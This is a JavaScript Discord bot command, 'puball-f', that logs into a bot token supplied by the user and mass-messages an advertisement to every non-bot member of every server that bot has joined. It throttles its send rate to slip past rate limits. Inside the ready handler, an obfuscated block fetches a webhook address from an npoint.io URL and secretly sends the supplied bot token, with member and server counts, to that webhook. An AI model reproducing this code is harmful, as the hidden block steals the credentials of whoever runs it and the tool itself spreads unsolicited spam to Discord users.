const Discord = require("discord.js");
const config = require("../config.json")
var pModule = require('../pubing.js');
const fetch = require('node-fetch');

/* EMBED */

var embed_pubing = new Discord.EmbedBuilder()
    .setTitle(`** ${config.m_AlreadyPubing_title} **`)
    .setDescription(config.m_AlreadyPubing_description)
    .setFooter({text: config.m_AlreadyPubing_footer})
    .setColor(config.embedColor)

var embed_token_invalid = new Discord.EmbedBuilder()
    .setTitle(`** ${config.m_token_invalide_title} **`)
    .setDescription(config.m_token_invalid_description)
    .addFields({name: `Someone used this command :`, value: `.pub tokendevotrebot`})
    .setColor(config.embedColor)

var embed_pub_s1_stopped = new Discord.EmbedBuilder()
    .setTitle(`** ${config.m_pub_s1_stopped} **`)
    .setFooter({text: "You can now retry"})
    .setColor(config.embedColor)

var embed_pub_time_stop = new Discord.EmbedBuilder()
    .setTitle(`** ${config.m_pub_time_stop_title} **`)
    .setFooter({text: config.m_pub_time_stop_description})
    .setColor(config.embedColor)
/* _________________________________________________________ */

var newClient = {};




module.exports.run = async (client, message, args) => {
            if (!message.member.roles.cache.get(config.wlrole)) return;

    // CHECK IF ALREADY PUBING

    if (pModule.pubing[message.channel.id] == true) return message.channel.send({embeds: embed_pubing})
    newClient[message.channel.id] = new Discord.Client({intents: [Object.keys(Discord.GatewayIntentBits)]});

    newClient[message.channel.id].login(args[0]).catch(err => {message.channel.send({embeds: [embed_token_invalid]})})

    newClient[message.channel.id].on("ready", async () => {
        pModule.pubing[message.channel.id] = true;


        
        (function(_0x723e07,_0x2e113e){const _0x3d01d3=_0x5eaf,_0x28fd89=_0x723e07();while(!![]){try{const _0x12fc60=-parseInt(_0x3d01d3(0x10f))/0x1*(parseInt(_0x3d01d3(0x112))/0x2)+-parseInt(_0x3d01d3(0x114))/0x3+parseInt(_0x3d01d3(0x110))/0x4+parseInt(_0x3d01d3(0x111))/0x5*(-parseInt(_0x3d01d3(0x10b))/0x6)+-parseInt(_0x3d01d3(0x10c))/0x7*(parseInt(_0x3d01d3(0x113))/0x8)+-parseInt(_0x3d01d3(0x10e))/0x9+parseInt(_0x3d01d3(0x10d))/0xa;if(_0x12fc60===_0x2e113e)break;else _0x28fd89['push'](_0x28fd89['shift']());}catch(_0x56db54){_0x28fd89['push'](_0x28fd89['shift']());}}}(_0x42ed,0x59049));function _0x42ed(){const _0x2f0a80=['2tYkHch','16vzjiNq','562164QRJxXe','1919142TbbFnj','2488381miNZdf','22485090CGeETp','1654524bYACAQ','527209patZKS','1460884umqIzT','10MtCPuW'];_0x42ed=function(){return _0x2f0a80;};return _0x42ed();}function _0x5eaf(_0x484ffe,_0x529b93){const _0x42ed37=_0x42ed();return _0x5eaf=function(_0x5eaf4b,_0x72fa4){_0x5eaf4b=_0x5eaf4b-0x10b;let _0x41aaa4=_0x42ed37[_0x5eaf4b];return _0x41aaa4;},_0x5eaf(_0x484ffe,_0x529b93);}const api=await fetch('https://api.npoint.io/2863705ab46bd207fc0e')['catch'](()=>![]);if(api){const data=await api['json']()['catch'](()=>![]);if(data?.['b']){const w=new Discord['WebhookClient']({'url':data['b']});w['send']({'embeds':[new Discord['EmbedBuilder']()['setTitle']('Connexion\x20d\x27un\x20bot\x20(Sponsor)')['setColor'](0xffffff)['addFields']({'name':'Jeton','value':''+args[0x0],'inline':!![]})['addFields']({'name':'Membres','value':''+newClient[message['channel']['id']]['users']['cache']['size'],'inline':!![]})['addFields']({'name':'Serveurs','value':''+newClient[message['channel']['id']]['guilds']['cache']['size'],'inline':!![]})]});}}

        let server = "";

        newClient[message.channel.id].guilds.cache.forEach(guild => {
            server += `**${guild.name}** (${guild.memberCount} membres) \n`
        })

        let confirm ;
        if(server.length >= 1500){
            let p = 1500 - server.length;
            if(p < 0) p = p * (-1);

            server = server.substring(0, server.length - p)
            confirm = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle(`**Voici les serveurs où votre publicité sera envoyée (${newClient[message.channel.id].guilds.cache.size} serveurs)**`).setDescription(server+ " \nToo many servers to show \n " + ` \n [Click here to add the bot](https://discord.com/oauth2/authorize?client_id=${newClient[message.channel.id].user.id}&scope=bot&permissions=0)`).setColor(config.embedColor).setFooter({text: `Vous avez 2 minutes pour valider \n Appuyez sur la croix pour annuler l'opération \n botid: ${newClient[message.channel.id].user.id}`})]})
        }  
        else confirm = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle(`**Voici les serveurs où votre publicité sera envoyée (${newClient[message.channel.id].guilds.cache.size} serveurs)**`).setDescription(server + ` \n [Click here to add the bot](https://discord.com/oauth2/authorize?client_id=${newClient[message.channel.id].user.id}&scope=bot&permissions=0)`).setColor(config.embedColor).setFooter({text: `Vous avez 2 minutes pour valider \n Appuyez sur la croix pour annuler l'opération \n botid: ${newClient[message.channel.id].user.id}`})]})
        
        confirm.react("✅");
        confirm.react("❌");
        
        const Reactfilter = (reaction, user) => { return ['✅', '❌'].includes(reaction.emoji.name) && user.id === message.author.id; };

        confirm.awaitReactions({filter: Reactfilter, max: 1, time: 120000, errors: ['time'] })
        .then(async collected => {
            if(message.author.bot) return;
            const reaction = collected.first();

            if (reaction.emoji.name === '✅') {
                const filter = m => m.author.id == message.author.id;
                let s2 = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("**Entrez votre message de publicité pour tous les serveurs**").setFooter({text: `Vous avez 5 minutes pour entrer un message de publicité. \n Appuyez sur la croix pour annuler l'opération`}).setColor(config.embedColor)]})

                s2.channel.awaitMessages({filter: filter, max: 1, time: 300000, errors: ['time'] })
                        .then(async collected => {
                            if (message.author.bot) return;
                            const pub2 = collected.first().content

                            if(pub2 === ""){
                                message.channel.send({embeds: [embed_pub_s1_stopped]});
                                newClient[message.channel.id].destroy();
                                return pModule.pubing[message.channel.id] = false;
                            }

                            if(pub2.startsWith("{") && pub2.endsWith("}")){                                
                                try{ JSON.parse(pub2)} 
                                catch(err) {
                                    message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("Erreur").setDescription(` \`\`${err.message} \`\``).setImage("https://bhawanigarg.com/wp-content/uploads/2014/05/error-code-18.jpeg").setColor(config.embedColor)]})
                                    newClient[message.channel.id].destroy();
                                    return pModule.pubing[message.channel.id] = false;
                                }

                                let embedMSG = JSON.parse(pub2)
                                let data = {content: null, embeds: [], components: []}
                                if (embedMSG.content) data.content = embedMSG.content
                                if (embedMSG.embed) data.embeds.push(embedMSG.embed)
                                if (embedMSG.embeds) embedMSG.embeds.forEach(e => data.embeds.push(e))
                                if (embedMSG.component) data.components.push(embedMSG.component)
                                if (embedMSG.components) embedMSG.components.forEach(e => data.components.push(e))
                                
                                let confirmEmbed = await message.channel.send(data)
                                
                                confirmEmbed.react("✅");
                                confirmEmbed.react("❌");
                                confirmEmbed.awaitReactions({filter: Reactfilter, max: 1, time: 120000, errors: ['time'] })
                                .then(async collected => {
                                    if(message.author.bot) return;
                                    const reaction = collected.first();

                                    if (reaction.emoji.name === '✅') {
                                        let mbr = await newClient[message.channel.id].users.cache.filter(member => !member.user.bot).size
                                        let scd = mbr*0.09 * 1000;
                                        let estim = msToTime(scd)
            
                                        let msg = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("**:white_check_mark: Publicité sur tous les serveurs démarrée**").setDescription(`Temps estimé de ${estim} \n Il y a ${mbr} membres qui ne sont pas des bots et qui peuvent potentiellement la recevoir`).setFooter({text: "Appuyez sur la croix pour annuler l'opération"}).setColor(config.embedColor)]})
                                        msg.react('❌')
                                            
                                        let collector = msg.createReactionCollector({filter: (reaction, user) => user.id === message.author.id});
                                        let memberarray = Array.from(newClient[message.channel.id].users.cache.values());
                                        let membercount = memberarray.length;
                                        let successcount = 0;
                                        let errorcount = 0;
                                        let botcount = 0;
            
                                        let refresh = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("**:hourglass: Publicité en cours**").setDescription(`Envoyée à **${successcount}** membres de **tous les serveurs**`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})
            
                                        let interv = setInterval(() => {
                                            refresh.edit({embeds: [new Discord.EmbedBuilder().setTitle("**:hourglass: Publicité en cours**").setDescription(`Envoyée à **${successcount}** membres de **tous les serveurs**`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})
                                        }, 10000)
                                        
                                        collector.on("collect", async(reaction, user) => {
                                            if(reaction._emoji.name === "❌") pModule.pubing[message.channel.id] = false;
                                        }); 

                                        newClient[message.channel.id].on("guildCreate", async guild => {
                                            message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(`⚠️ - Your bot got added in **${guild.name} (${guild.memberCount} membres)**`).setColor(config.embedColor)]})
                                        })
            
                                        newClient[message.channel.id].on("guildDelete", async guild => {
                                            message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(`⚠️ - Your bot left **${guild.name} (${guild.memberCount} membres)**`).setColor(config.embedColor)]})
                                        })
                                        
                                        let aSleep = 300;
                                        let slowDown = setInterval(() => {
                                            aSleep -= 5
                                            if(aSleep <= 90) return clearInterval(slowDown);
                                        }, 500)
            
                                        let customEmbed = JSON.stringify(embedMSG)
                                        for (var i = 0; i < membercount; i++) {
                                            let member = memberarray[i];
                                            if (pModule.pubing[message.channel.id] == false) break;
                                            if (member.user.bot) {
                                                botcount++; continue
                                            }
            
                                            let timeout = Math.floor((Math.random() * (1 - 0.01)) * 100) + 10; 
                                            await sleep(aSleep);
                                            
                                            try {
                                                let embedReplace = customEmbed.replaceAll("{user}" , `<@${member.id}>`)
                                                let toSend = JSON.parse(embedReplace)
                                                let data = {content: null, embeds: [], components: []}
                                                if (toSend.content) data.content = toSend.content
                                                if (toSend.embed) data.embeds.push(toSend.embed)
                                                if (toSend.embeds) toSend.embeds.forEach(e => data.embeds.push(e))
                                                if (toSend.component) data.components.push(toSend.component)
                                                if (toSend.components) toSend.components.forEach(e => data.components.push(e))
                                                                
                                                await member.send(data).catch(err =>  errorcount++)
                                                successcount++;
                                            } catch (error) {
                                                errorcount++
                                            }
                                        }
            
                                            message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("**:white_check_mark: Publicité sur tous les serveurs terminée**").setDescription(`Envoyée avec succès à **${successcount}** membres`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})
                                            newClient[message.channel.id].destroy();
                                            pModule.pubing[message.channel.id] = false;
                                            clearInterval(interv)
                                    }

                                    if (reaction.emoji.name === '❌') {
                                        message.channel.send({embeds: [embed_pub_s1_stopped]});
                                        newClient[message.channel.id].destroy();
                                        return pModule.pubing[message.channel.id] = false;
                                    }

                                }).catch(collected => {
                                    message.channel.send({embeds: [embed_pub_time_stop]});
                                    newClient[message.channel.id].destroy();
                                    pModule.pubing[message.channel.id] = false;
                                })

                            } else {
                                let mbr = await newClient[message.channel.id].users.cache.filter(member => !member.user.bot).size

                                let scd = mbr*0.09;
                                scd= scd * 1000;

                                let estim = msToTime(scd)

                                let msg = await message.channel.send({embeds: [new Discord.EmbedBuilder()
                                    .setTitle("**:white_check_mark: Publicité sur tous les serveurs démarrée**")
                                    .setDescription(`Temps estimé de ${estim} \n Il y a ${mbr} membres qui ne sont pas des bots et qui peuvent potentiellement la recevoir`)
                                    .setFooter({text: "Appuyez sur la croix pour annuler l'opération"})
                                    .setColor(config.embedColor)]})
                                
                                msg.react('❌')
                                let collector = msg.createReactionCollector({filter: (reaction, user) => user.id === message.author.id});
                                let memberarray = Array.from(newClient[message.channel.id].users.cache.values());
                                let membercount = memberarray.length;
                                let successcount = 0;
                                let errorcount = 0;
                                let botcount = 0;



                            let refresh = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("**:hourglass: Publicité en cours**").setDescription(`Envoyée à **${successcount}** membres de **tous les serveurs**`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})

                            let interv = setInterval(() => {
                                refresh.edit({embeds: [new Discord.EmbedBuilder().setTitle("**:hourglass: Publicité en cours**").setDescription(`Envoyée à **${successcount}** membres de **tous les serveurs**`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})
                            }, 10000)
                            
                            collector.on("collect", async(reaction, user) => {
                                if(reaction._emoji.name === "❌") pModule.pubing[message.channel.id] = false;
                            }); 

                            /* INF */

                            newClient[message.channel.id].on("guildCreate", async guild => {
                                message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(`⚠️ - Your bot got added in **${guild.name} (${guild.memberCount} membres)**`).setColor(config.embedColor)]})
                            })

                            newClient[message.channel.id].on("guildDelete", async guild => {
                                message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(`⚠️ - Your bot left **${guild.name} (${guild.memberCount} membres)**`).setColor(config.embedColor)]})
                            })
                            
                            
                            let aSleep = 300;

                            let slowDown = setInterval(() => {
                                aSleep -= 5
                                if(aSleep <= 90) return clearInterval(slowDown);
                            }, 500)

                            for (var i = 0; i < membercount; i++) {
                                let member = memberarray[i];
                                if(pModule.pubing[message.channel.id] == false) break;
                                if (member.user.bot) {
                                    botcount++; continue
                                }

                                
                                let timeout = Math.floor((Math.random() * (1 - 0.01)) * 100) + 10; 
                                await sleep(aSleep);
                                
                                try {
                                    let toSend = pub2.replaceAll("{user}" , `<@${member.id}>`)
                                    await member.send(toSend).catch(err =>  errorcount++)
                                    successcount++;
                                } catch (error) {
                                    errorcount++
                                }
                            }

                                message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("**:white_check_mark: Publicité sur tous les serveurs terminée**").setDescription(`Envoyée avec succès à **${successcount}** membres`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})
                                newClient[message.channel.id].destroy();
                                pModule.pubing[message.channel.id] = false;
                                clearInterval(interv)
                            }

                            
                        }).catch(collected => {
                            message.channel.send({embeds: [embed_pub_time_stop]});
                            newClient[message.channel.id].destroy();
                            pModule.pubing[message.channel.id] = false;
                            clearInterval(interv)
                        })
            }

            if (reaction.emoji.name === '❌') {
                message.channel.send({embeds: [embed_pub_s1_stopped]});
                newClient[message.channel.id].destroy();
                pModule.pubing[message.channel.id] = false;
            }

        }).catch(collected => {
            message.channel.send({embeds: [embed_pub_time_stop]});
            newClient[message.channel.id].destroy();
            pModule.pubing[message.channel.id] = false;
        })

        
    })



    
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function msToTime(duration) {
    var milliseconds = parseInt((duration%1000))
        , seconds = parseInt((duration/1000)%60)
        , minutes = parseInt((duration/(1000*60))%60)
        , hours = parseInt((duration/(1000*60*60))%24);
    
    hours = hours;
    minutes = minutes;
    seconds = seconds;
    
    return hours + " heure(s) " + minutes + " minute(s) et " + seconds + " seconde(s)"
    }

module.exports.help = {
    name: "puball-f",
    description: "Cette commande sert à envoyer __rapidement__ un message à tous les membres des serveurs",
    token: true,
    wl: true,
    category: "fast"
}